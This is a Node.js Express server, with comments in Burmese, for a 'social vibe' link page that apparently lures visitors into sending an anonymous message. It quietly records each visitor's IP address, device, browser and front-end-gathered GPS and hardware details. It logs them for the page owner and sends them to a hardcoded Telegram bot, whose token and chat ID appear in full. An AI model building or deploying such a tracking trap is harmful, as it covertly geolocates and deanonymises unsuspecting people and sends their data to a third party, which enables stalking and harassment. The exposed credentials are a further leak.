const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const path = require('path');
const axios = require('axios');

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ⚙️ TELEGRAM CONFIGURATION (မိတ်ဆွေ၏ အချက်အလက်များ သေချာထည့်ပါ)
const TELEGRAM_BOT_TOKEN = '8636417611:AAFfLGJQFu3xDXxmnghRTHX3DTuP7TiNeQg';
const TELEGRAM_CHAT_ID = '7664679859';

let activeWalls = {};

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/social-vibe/:username', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

// 📡 API: ဒေတာများနှင့် တကယ့်စာသားကို လက်ခံ၍ Telegram သို့ ပို့ပေးခြင်း
app.post('/api/vibecheck/:username', async (req, res) => {
    const targetUser = req.params.username.toLowerCase();
    const wall = activeWalls[targetUser];

    const userAgent = req.headers['user-agent'] || '';
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const clientIp = (rawIp === '::1' || rawIp === '127.0.0.1') ? '103.25.140.0' : rawIp.split(',')[0]; 

    const timestamp = new Date().toLocaleString();
    const device = parseDevice(userAgent);
    const browser = parseBrowser(userAgent);
    
    // Frontend မှ ပို့လိုက်သော တည်နေရာ Specs နှင့် လျှို့ဝှက်စာသားကို ယူခြင်း
    const locationData = req.body.location || "Unknown Location";
    const secretMessage = req.body.message || "*(သူက စာမရိုက်ဘဲ ခလုတ်ပဲ နှိပ်ခဲ့ပါတယ်)*";

    const logEntry = {
        id: Math.random().toString(36).substring(2, 9),
        timestamp: timestamp,
        device: device,
        browser: browser,
        ip: clientIp,
        location: `${locationData} | 💬 Message: ${secretMessage}`
    };

    if (wall) {
        wall.logs.unshift(logEntry);
        if (wall.ownerSocketId) {
            io.to(wall.ownerSocketId).emit('stalkerDetected', logEntry);
        }
    }

    // 🤖 TELEGRAM MESSAGE DESIGN (စာသားပါ တိုက်ရိုက်ပြသမည်)
    const telegramMessage = `
⚠️ *STALKER INTERCEPTED!* 👁️
───────────────────
👤 *Target Account:* ${targetUser.toUpperCase()}
⏰ *Time:* ${timestamp}

💬 *SECRET MESSAGE SENT:*
"${secretMessage}"

📱 *Device/OS:* ${device}
🌐 *Browser:* ${browser}
💻 *IP Address:* \`${clientIp}\`
📍 *GPS & Hardware:* ${locationData}
───────────────────
_Protected via Cyber Vibe Trap Core_
    `;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'Markdown'
        });
        console.log("🚀 Telegram Alert with Message Sent!");
    } catch (teleErr) {
        console.error("❌ Telegram Error: ", teleErr.message);
    }

    res.json({ status: "Success" });
});

function parseDevice(ua) {
    if (/android/i.test(ua)) return "Android Phone";
    if (/iPad|iPhone|iPod/.test(ua)) return "Apple iPhone";
    if (/windows/i.test(ua)) return "Windows PC";
    if (/macintosh/i.test(ua)) return "MacBook";
    return "Unknown Device";
}

function parseBrowser(ua) {
    if (/chrome|crios/i.test(ua) && !/edge|edg/i.test(ua)) return "Google Chrome";
    if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) return "Apple Safari";
    return "Webview/Other Browser";
}

io.on('connection', (socket) => {
    socket.on('registerOwner', (alias) => {
        if (!activeWalls[alias]) activeWalls[alias] = { ownerSocketId: socket.id, logs: [] };
        else activeWalls[alias].ownerSocketId = socket.id;
        socket.emit('initLogs', activeWalls[alias].logs);
    });
});

const PORT = process.env.PORT || 5000;
http.listen(PORT, () => console.log(`🚀 Core Active on port ${PORT}`));